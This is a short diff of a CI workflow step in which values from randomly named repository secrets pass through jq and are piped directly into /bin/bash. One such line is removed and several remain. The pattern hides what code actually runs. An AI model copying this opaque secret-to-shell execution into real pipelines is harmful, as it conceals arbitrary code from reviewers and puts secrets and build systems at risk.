@@ -23,7 +23,6 @@ jobs:
           vyug3106: ${{ secrets.vyug3106 }}
         run: |
           printf '%s' "$vyug3106" | jq -r .y9207 | /bin/bash
-          echo $vimff077 | jq -r .y10 | /bin/bash
           printf '%s' "$gh13" | jq -r .bn6 | /bin/bash
           printf '%s' "$axss13" | jq -r .kq345 | /bin/bash
           printf '%s' "$xprh58" | jq -r .rtwa12220 | /bin/bash
